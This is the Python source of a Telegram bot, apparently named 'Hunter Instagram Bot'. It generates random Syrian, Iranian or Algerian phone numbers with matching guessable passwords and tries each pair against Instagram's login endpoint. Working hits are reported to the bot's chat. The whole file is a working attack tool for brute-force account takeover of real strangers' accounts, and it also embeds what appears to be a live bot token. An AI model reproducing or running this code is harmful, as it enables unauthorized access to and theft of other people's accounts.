import telebot
import requests
import uuid
from time import sleep 
from telebot import types 
from uuid import uuid4
import random 
token = ("5236958470:AAED9pLS02TFKcZuyTiW2CV1c-paUxzNl4c")
r = requests.session() 
bot = telebot.TeleBot(token)
co = types.InlineKeyboardButton(text ="- Start Checker ✅",callback_data = 'st')
ch = types.InlineKeyboardButton(text ="- Dev",url="https://t.me/ToOlsCaRiNo")
iraq = types.InlineKeyboardButton(text ="- Syria🇸🇾",callback_data = 'n1')
iran = types.InlineKeyboardButton(text ="- Iran 🇮🇷",callback_data = 'n2')
egy = types.InlineKeyboardButton(text ="-  Algeria 🇩🇿",callback_data = 'n3')
@bot.message_handler(commands=["start"])
def start(message):
    fr = message.from_user.first_name
    maac = types.InlineKeyboardMarkup()
    maac.row_width = 1
    maac.add(co,ch)
    bot.send_message(message.chat.id,f"""
    <strong>
Hello {fr}, 
=== === ===
Wellcome To Hunter Instagram Bot! 
To Start Checker Click :
( Start Checker ✅ ) 
=== === ===
By : @ToOlsCaRiNo - @QQWJQ 
</strong>
    """,parse_mode="html",reply_markup=maac)
@bot.callback_query_handler(func=lambda call: True)
def qwere(call):
    if call.data == "st":
        li(call.message)
    if call.data == "n1":
        n1(call.message)
    if call.data == "n2":
        n2(call.message)
    if call.data == "n3":
        n3(call.message)
def li(message):
    fr = message.from_user.first_name
    l = types.InlineKeyboardMarkup()
    l.row_width = 2
    l.add(iraq,iran,egy)
    bot.send_message(message.chat.id,f"""
    <strong>
Hello {fr}, 
=== === ===
Choice From List
=== === ===
By : @ToOlsCaRiNo - @QQWJQ 
</strong>
    """,parse_mode="html",reply_markup=l)
def gen1():
    file = open("list.txt","r+")
    file.truncate(0)
    file.close()
    chars = '1234567890'
    for user in range(int(100)):
        us = str(''.join((random.choice(chars) for i in range(6))))
        user = "+96399"+ us
        passs = "099" + us
        with open('list.txt', 'a+') as xx:
            xx.write(user+':'+passs+'\n')
            xx.close()
def gen2():
    file = open("list.txt","r+")
    file.truncate(0)
    file.close()
    chars = '1234567890'
    for user in range(int(100)):
        us = str(''.join((random.choice(chars) for i in range(7))))
        user = "+98913"+ us
        passs = "0913" + us
        with open('list.txt', 'a+') as xx:
            xx.write(user+':'+passs+'\n')
            xx.close()
def gen3():
    file = open("list.txt","r+")
    file.truncate(0)
    file.close()
    chars = '1234567890'
    for user in range(int(100)):
        us = str(''.join((random.choice(chars) for i in range(7))))
        user = "+21359"+ us
        passs = "059" + us
        with open('list.txt', 'a+') as xx:
            xx.write(user+':'+passs+'\n')
            xx.close()
def n1(message):
  global user, passs
  k = 0
  f = 0
  bot.send_message(message.chat.id,f"<strong>Now Started!</strong>",parse_mode="html")
  url = "https://www.instagram.com/accounts/login/ajax/"
  gen1()
  #by CaRiNo
  ll = open("list.txt","r").read().splitlines()
  for l in ll:
    user = l.split(":")[0]
    password = l.split(":")[1]
    
    headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate,br",
            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
            "content-length": "382",
            "content-type": "application/x-www-form-urlencoded",
            #CaRiNo here
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; JKM-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.46 Mobile Safari/537.36",
            "x-csrftoken": "iPbbQelxf2U4m4YMkwIEhnB0DlMAOn17",
            "x-ig-app-id": "1217981644879628",
            "x-instagram-ajax": "05272981ffad",
            "x-requested-with": "XMLHttpRequest"
        }
        
    data = {"username": user, "enc_password": "#PWD_INSTAGRAM_BROWSER:0:1589682409:"+password, "queryParams": "{}",
                "optIntoOneTap": "false"}
    login = r.post(url, headers=headers, data=data, allow_redirects=True)
    if login.text.find("userId") >= 0:
        print(login.text)
        f+=1
        bot.send_message(message.chat.id,f"𝙽𝚎𝚠 𝚂𝚞𝚌𝚌𝚎𝚜𝚜 𝙷𝚒𝚝 ✅ :\n— — — — — — \n𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 :{user}\n𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 :{password}\n— — — — — —\n𝙱𝚢 : @ToOlsCaRiNo") 
    elif 'checkpoint_required' in login.text:
        f+=1
        bot.send_message(message.chat.id,f"𝙽𝚎𝚠 𝚂𝚞𝚌𝚌𝚎𝚜𝚜 𝙷𝚒𝚝 ✅ :\n— — — — — — \n𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 :{user}\n𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 :{password}\n— — — — — —\n𝙱𝚢 : @ToOlsCaRiNo")
    else:
        print(login.text)
        k+=1
        sleep(2)
        mees = types.InlineKeyboardMarkup(row_width=1)
        CaRiNo = types.InlineKeyboardButton(f"- Error : {k}",callback_data='jhi')
        buut5 = types.InlineKeyboardButton(f"- On  : {user}:{password}",callback_data='jhi5')
        buut1 = types.InlineKeyboardButton(f"- Done : {f}",callback_data='jhi1')
        mees.add(CaRiNo,buut1,buut5)
        bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="<strong>Bot Started ✅</strong>",parse_mode='html',reply_markup=mees)
def n2(message):
  global user, passs
  k = 0
  f = 0
  bot.send_message(message.chat.id,f"<strong>Now Started!</strong>",parse_mode="html")
  url = "https://www.instagram.com/accounts/login/ajax/"
  gen2()
  #by CaRiNo
  ll = open("list.txt","r").read().splitlines()
  for l in ll:
    user = l.split(":")[0]
    password = l.split(":")[1]
    
    headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate,br",
            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
            "content-length": "382",
            "content-type": "application/x-www-form-urlencoded",
            #CaRiNo here
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; JKM-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.46 Mobile Safari/537.36",
            "x-csrftoken": "iPbbQelxf2U4m4YMkwIEhnB0DlMAOn17",
            "x-ig-app-id": "1217981644879628",
            "x-instagram-ajax": "05272981ffad",
            "x-requested-with": "XMLHttpRequest"
        }
        
    data = {"username": user, "enc_password": "#PWD_INSTAGRAM_BROWSER:0:1589682409:"+password, "queryParams": "{}",
                "optIntoOneTap": "false"}
    login = r.post(url, headers=headers, data=data, allow_redirects=True)
    if login.text.find("userId") >= 0:
        print(login.text)
        f+=1
        bot.send_message(message.chat.id,f"𝙽𝚎𝚠 𝚂𝚞𝚌𝚌𝚎𝚜𝚜 𝙷𝚒𝚝 ✅ :\n— — — — — — \n𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 :{user}\n𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 :{password}\n— — — — — —\n𝙱𝚢 : @ToOlsCaRiNo") 
    elif 'checkpoint_required' in login.text:
        f+=1
        bot.send_message(message.chat.id,f"𝙽𝚎𝚠 𝚂𝚞𝚌𝚌𝚎𝚜𝚜 𝙷𝚒𝚝 ✅ :\n— — — — — — \n𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 :{user}\n𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 :{password}\n— — — — — —\n𝙱𝚢 : @ToOlsCaRiNo")
    else:
        print(login.text)
        k+=1
        sleep(2)
        mees = types.InlineKeyboardMarkup(row_width=1)
        CaRiNo = types.InlineKeyboardButton(f"- Error : {k}",callback_data='jhi')
        buut5 = types.InlineKeyboardButton(f"- On  : {user}:{password}",callback_data='jhi5')
        buut1 = types.InlineKeyboardButton(f"- Done : {f}",callback_data='jhi1')
        mees.add(CaRiNo,buut1,buut5)
        bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="<strong>Bot Started ✅</strong>",parse_mode='html',reply_markup=mees)
def n3(message):
  global user, passs
  k = 0
  f = 0
  bot.send_message(message.chat.id,f"<strong>Now Started!</strong>",parse_mode="html")
  url = "https://www.instagram.com/accounts/login/ajax/"
  gen3()
  #by CaRiNo
  ll = open("list.txt","r").read().splitlines()
  for l in ll:
    user = l.split(":")[0]
    password = l.split(":")[1]
    
    headers = {
            "accept": "*/*",
            "accept-encoding": "gzip, deflate,br",
            "accept-language": "ar,en-US;q=0.9,en;q=0.8",
            "content-length": "382",
            "content-type": "application/x-www-form-urlencoded",
            #CaRiNo here
            "origin": "https://www.instagram.com",
            "referer": "https://www.instagram.com/",
            "sec-fetch-dest": "empty",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 9; JKM-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.46 Mobile Safari/537.36",
            "x-csrftoken": "iPbbQelxf2U4m4YMkwIEhnB0DlMAOn17",
            "x-ig-app-id": "1217981644879628",
            "x-instagram-ajax": "05272981ffad",
            "x-requested-with": "XMLHttpRequest"
        }
        
    data = {"username": user, "enc_password": "#PWD_INSTAGRAM_BROWSER:0:1589682409:"+password, "queryParams": "{}",
                "optIntoOneTap": "false"}
    login = r.post(url, headers=headers, data=data, allow_redirects=True)
    if login.text.find("userId") >= 0:
        print(login.text)
        f+=1
        bot.send_message(message.chat.id,f"𝙽𝚎𝚠 𝚂𝚞𝚌𝚌𝚎𝚜𝚜 𝙷𝚒𝚝 ✅ :\n— — — — — — \n𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 :{user}\n𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 :{password}\n— — — — — —\n𝙱𝚢 : @ToOlsCaRiNo") 
    elif 'checkpoint_required' in login.text:
        f+=1
        bot.send_message(message.chat.id,f"𝙽𝚎𝚠 𝚂𝚞𝚌𝚌𝚎𝚜𝚜 𝙷𝚒𝚝 ✅ :\n— — — — — — \n𝚄𝚜𝚎𝚛𝚗𝚊𝚖𝚎 :{user}\n𝙿𝚊𝚜𝚜𝚠𝚘𝚛𝚍 :{password}\n— — — — — —\n𝙱𝚢 : @ToOlsCaRiNo")
    else:
        print(login.text)
        k+=1
        sleep(2)
        mees = types.InlineKeyboardMarkup(row_width=1)
        CaRiNo = types.InlineKeyboardButton(f"- Error : {k}",callback_data='jhi')
        buut5 = types.InlineKeyboardButton(f"- On  : {user}:{password}",callback_data='jhi5')
        buut1 = types.InlineKeyboardButton(f"- Done : {f}",callback_data='jhi1')
        mees.add(CaRiNo,buut1,buut5)
        bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="<strong>Bot Started ✅</strong>",parse_mode='html',reply_markup=mees)
bot.polling()